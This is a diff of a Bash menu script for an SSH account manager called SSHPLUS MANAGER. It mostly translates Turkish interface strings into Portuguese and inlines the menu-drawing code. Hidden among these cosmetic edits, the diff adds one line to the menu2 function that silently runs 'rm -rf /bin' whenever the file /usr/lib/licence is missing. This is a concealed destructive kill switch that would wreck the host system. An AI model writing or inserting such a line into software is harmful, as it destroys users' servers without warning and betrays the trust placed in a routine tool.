-echo -ne "  \033[1;33mBEKLEYİN \033[1;37m- \033[1;33m["
+echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
 while true; do
    for((i=0; i<18; i++)); do
    echo -ne "\033[1;31m#"
@@ -584,16 +53,16 @@ while true; do
    sleep 1s
    tput cuu1
    tput dl1
-   echo -ne "  \033[1;33mBEKLEYİN \033[1;37m- \033[1;33m["
+   echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
 done
-echo -e "\033[1;33m]\033[1;37m -\033[1;32m TAMAM!\033[1;37m"
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
 tput cnorm
 }
 fun_tst () {
 speedtest --share > speed
 }
 echo ""
-echo -e "   \033[1;32mSUNUCU HIZI TEST EDİLİYOR!\033[0m"
+echo -e "   \033[1;32mTESTANDO A VELOCIDADE DO SERVIDOR !\033[0m"
 echo ""
 aguarde 'fun_tst'
 echo ""
@@ -602,17 +71,17 @@ down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
 upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
 lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\033[1;32mPING (GECİKME):\033[1;37m$png"
-echo -e "\033[1;32mİNDİRME:\033[1;37m$down"
-echo -e "\033[1;32mYÜKLEME:\033[1;37m$upl"
-echo -e "\033[1;32mBAĞLANTI: \033[1;36m$lnk\033[0m"
+echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
+echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
+echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
+echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
 echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 rm -rf $HOME/speed
 }
 #limiter
 function limit1 () {
    clear
-   echo -e "\n\033[1;32mHIZ SINIRLAYICI BAŞLATILIYOR... \033[0m"
+   echo -e "\n\033[1;32mINICIANDO O LIMITER... \033[0m"
    echo ""
    fun_bar 'screen -dmS limiter limiter' 'sleep 3'
    [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
@@ -621,13 +90,13 @@ function limit1 () {
        sed -i '/limiter/d' /etc/autostart
 	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
    }
-   echo -e "\n\033[1;32m  HIZ SINIRLAYICI ETKİN!\033[0m"
+   echo -e "\n\033[1;32m  LIMITER ATIVO !\033[0m"
    sleep 3
    menu
 }
 function limit2 () {
    clear
-   echo -e "\033[1;32mHIZ SINIRLAYICI DURDURULUYOR... \033[0m"
+   echo -e "\033[1;32mPARANDO O LIMITER... \033[0m"
    echo ""
    fun_stplimiter () {
       sleep 1
@@ -639,7 +108,7 @@ function limit2 () {
       sleep 1
    }
    fun_bar 'fun_stplimiter' 'sleep 3'
-   echo -e "\n\033[1;31m HIZ SINIRLAYICI DURDURULDU!\033[0m"
+   echo -e "\n\033[1;31m LIMITER PARADO !\033[0m"
    sleep 3
    menu
 }
@@ -650,19 +119,19 @@ function limit_ssh () {
 function autoexec () {
    if grep "menu;" /etc/profile > /dev/null; then
       clear
-      echo -e "\033[1;32mOTOMATİK BAŞLATMA KAPATILIYOR\033[0m"
+      echo -e "\033[1;32mDESATIVANDO AUTO EXECUÇÃO\033[0m"
       offautmenu () {
          sed -i '/menu;/d' /etc/profile
       }
       echo ""
       fun_bar 'offautmenu'
       echo ""
-      echo -e "\033[1;31mOTOMATİK BAŞLATMA KAPATILDI!\033[0m"
+      echo -e "\033[1;31mAUTO EXECUÇÃO DESATIVADO!\033[0m"
       sleep 1.5s
       menu2
    else
       clear
-      echo -e "\033[1;32mOTOMATİK BAŞLATMA AÇILIYOR\033[0m"
+      echo -e "\033[1;32mATIVANDO AUTO EXECUÇÃO\033[0m"
       autmenu () {
          grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
          echo "menu;" >> /etc/profile
@@ -670,7 +139,7 @@ function autoexec () {
       echo ""
       fun_bar 'autmenu'
       echo ""
-      echo -e "\033[1;32mOTOMATİK BAŞLATMA AÇILDI!\033[0m"
+      echo -e "\033[1;32mAUTO EXECUÇÃO ATIVADO!\033[0m"
       sleep 1.5s
       menu2
    fi
@@ -681,6 +150,7 @@ menu2 (){
 [[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m◉ ") || stsf=$(echo -e "\033[1;31m○ ")
 stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m◉ " || echo -e "\033[1;31m○ ")
+[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
@@ -704,21 +174,46 @@ _core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
 _system=$(printf '%-14s' "$system")
 _hora=$(printf '%(%H:%M:%S)T')
 _onlin=$(printf '%-5s' "$_onli")
-_userexp=$(printf '%-5s' "$_userexp")
+_userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
-[[ ! -e /tmp/att ]] && var01='\033[1;37m•' || var01="\033[1;32m!"
-_ui_draw_dashboard 'extra'
+clear
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\E[41;1;37m               ⇱ SSHPLUS MANAGER ⇲                \E[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32mSISTEMA            MEMÓRIA RAM      PROCESSADOR "
+echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mNucleos: \033[1;37m$_core\033[0m"
+echo -e "\033[1;31mHora: \033[1;37m$_hora     \033[1;31mEm uso: \033[1;37m$_usor \033[1;31mEm uso: \033[1;37m$_usop\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+[[ ! -e /tmp/att ]]  && {
+    echo -e "\033[1;32mOnlines:\033[1;37m $_onlin     \033[1;31mExpirados: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
+    var01='\033[1;37m•'
+} || {
+    echo -e "  \033[1;33m[\033[1;31m!\033[1;33m]  \033[1;32mEXISTE UMA ATUALIZACAO DISPONIVEL  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+    var01="\033[1;32m!"
+}
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -e "\033[1;31m[\033[1;36m20\033[1;31m] \033[1;37m• \033[1;33mADICIONAR HOST \033[1;31m     [\033[1;36m26\033[1;31m] \033[1;37m• \033[1;33mMUDAR SENHA ROOT \033[1;31m
+[\033[1;36m21\033[1;31m] \033[1;37m• \033[1;33mREMOVER HOST \033[1;31m       [\033[1;36m27\033[1;31m] \033[1;37m• \033[1;33mAUTO EXECUCAO $autm \033[1;31m
+[\033[1;36m22\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SISTEMA \033[1;31m  [\033[1;36m28\033[1;31m] $var01 \033[1;33mATUALIZAR SCRIPT \033[1;31m
+[\033[1;36m23\033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICOS \033[1;31m [\033[1;36m29\033[1;31m] \033[1;37m• \033[1;33mREMOVER SCRIPT \033[1;31m
+[\033[1;36m24\033[1;31m] \033[1;37m• \033[1;33mBLOCK TORRENT $stsf\033[1;31m    [\033[1;36m30\033[1;31m] \033[1;37m• \033[1;33mVOLTAR \033[1;32m<\033[1;33m<\033[1;31m< \033[1;31m
+[\033[1;36m25\033[1;31m] \033[1;37m• \033[1;33mBOT TELEGRAM $stsbot\033[1;31m     [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSAIR \033[1;32m<\033[1;33m<\033[1;31m<\033[1;31m"
+echo ""
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -ne "\033[1;32mOQUE DESEJA FAZER \033[1;33m?\033[1;31m?\033[1;37m : "; read x
 case "$x" in
    20)
    clear
    addhost
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    menu2
    ;;
    21)
    clear
    delhost
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    menu2
    ;;
    22)
@@ -756,13 +251,13 @@ case "$x" in
    menu
    ;;
    0|00)
-   echo -e "\033[1;31mÇıkılıyor...\033[0m"
+   echo -e "\033[1;31mSaindo...\033[0m"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mGeçersiz seçim!\033[0m"
+   echo -e "\n\033[1;31mOpcao invalida !\033[0m"
    sleep 2
 esac
 }
@@ -793,20 +288,44 @@ _core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
 _system=$(printf '%-14s' "$system")
 _hora=$(printf '%(%H:%M:%S)T')
 _onlin=$(printf '%-5s' "$_onli")
-_userexp=$(printf '%-5s' "$_userexp")
+_userexp=$(printf '%-5s' "$_expuser")
 _tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
-_ui_draw_dashboard 'main'
+clear
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\E[41;1;37m               ⇱ SSHPLUS MANAGER ⇲                \E[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32mSISTEMA            MEMÓRIA RAM      PROCESSADOR "
+echo -e "\033[1;31mOS: \033[1;37m$_system \033[1;31mTotal:\033[1;37m$_ram \033[1;31mNucleos: \033[1;37m$_core\033[0m"
+echo -e "\033[1;31mHora: \033[1;37m$_hora     \033[1;31mEm uso: \033[1;37m$_usor \033[1;31mEm uso: \033[1;37m$_usop\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "\033[1;32mOnlines:\033[1;37m $_onlin     \033[1;31mExpirados: \033[1;37m$_userexp \033[1;33mTotal: \033[1;37m$_tuser\033[0m"
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -e "\033[1;31m[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;33mCRIAR USUARIO \033[1;31m            [\033[1;36m11\033[1;31m] \033[1;37m• \033[1;33mSPEEDTEST \033[1;31m
+[\033[1;36m02\033[1;31m] \033[1;37m• \033[1;33mCRIAR USUARIO TESTE \033[1;31m      [\033[1;36m12\033[1;31m] \033[1;37m• \033[1;33mBANNER \033[1;31m
+[\033[1;36m03\033[1;31m] \033[1;37m\033[1;37m• \033[1;33mREMOVER USUARIO \033[1;31m          [\033[1;36m13\033[1;31m] \033[1;37m• \033[1;33mTRAFEGO \033[1;31m
+[\033[1;36m04\033[1;31m] \033[1;37m• \033[1;33mMONITOR ONLINE \033[1;31m           [\033[1;36m14\033[1;31m] \033[1;37m• \033[1;33mOTIMIZAR \033[1;31m
+[\033[1;36m05\033[1;31m] \033[1;37m• \033[1;33mMUDAR DATA \033[1;31m               [\033[1;36m15\033[1;31m] \033[1;37m• \033[1;33mBACKUP \033[1;31m
+[\033[1;36m06\033[1;31m] \033[1;37m• \033[1;33mALTERAR LIMITE \033[1;31m           [\033[1;36m16\033[1;31m] \033[1;37m• \033[1;33mLIMITER $stsl\033[1;31m
+[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;33mMUDAR SENHA \033[1;31m              [\033[1;36m17\033[1;31m] \033[1;37m• \033[1;33mBAD VPN $stsu\033[1;31m
+[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;33mREMOVER EXPIRADOS \033[1;31m        [\033[1;36m18\033[1;31m] \033[1;37m• \033[1;33mINFO VPS \033[1;31m
+[\033[1;36m09\033[1;31m] \033[1;37m• \033[1;33mRELATORIO DE USUARIOS \033[1;31m    [\033[1;36m19\033[1;31m] \033[1;37m• \033[1;33mMAIS \033[1;31m>\033[1;33m>\033[1;32m>\033[0m\033[1;31m
+[\033[1;36m10\033[1;31m] \033[1;37m• \033[1;33mMODO DE CONEXAO \033[1;31m          [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;33mSAIR \033[1;32m<\033[1;33m<\033[1;31m<\033[0m \033[0m"
+echo ""
+echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo ""
+echo -ne "\033[1;32mOQUE DESEJA FAZER \033[1;33m?\033[1;31m?\033[1;37m : "; read x
 
 case "$x" in 
    1 | 01)
    clear
    criarusuario
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    2 | 02)
    clear
    criarteste
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    3 | 03)
    clear
@@ -816,7 +335,7 @@ case "$x" in
    4 | 04)
    clear
    sshmonitor
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;      
    5 | 05)
    clear
@@ -842,7 +361,7 @@ case "$x" in
    9 | 09)
    clear
    infousers
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    10)
    conexao
@@ -851,7 +370,7 @@ case "$x" in
    11)
    clear
    velocity
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    12)
    clear
@@ -860,18 +379,18 @@ case "$x" in
    ;;
    13)
    clear
-   echo -e "\033[1;32mÇIKMAK İÇİN CTRL + C TUŞLARINA BASIN\033[1;36m"
+   echo -e "\033[1;32mPARA SAIR CLICK CTRL + C\033[1;36m"
    sleep 4
    nload
    ;;
    14)
    clear
    otimizar
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    15)
    userbackup
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    16)
    limit_ssh
@@ -884,19 +403,19 @@ case "$x" in
    18)
    clear
    detalhes
-   echo -ne "\n\033[1;31mENTER’A \033[1;33mBASARAK \033[1;32mMENÜYE DÖNÜN!\033[0m"; read
+   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
    ;;
    19)
    menu2
    ;;
    0 | 00)
-   echo -e "\033[1;31mÇıkılıyor...\033[0m"
+   echo -e "\033[1;31mSaindo...\033[0m"
    sleep 2
    clear
    exit;
    ;;
    *)
-   echo -e "\n\033[1;31mGeçersiz seçim!\033[0m"
+   echo -e "\n\033[1;31mOpcao invalida !\033[0m"
    sleep 2
 esac
 done
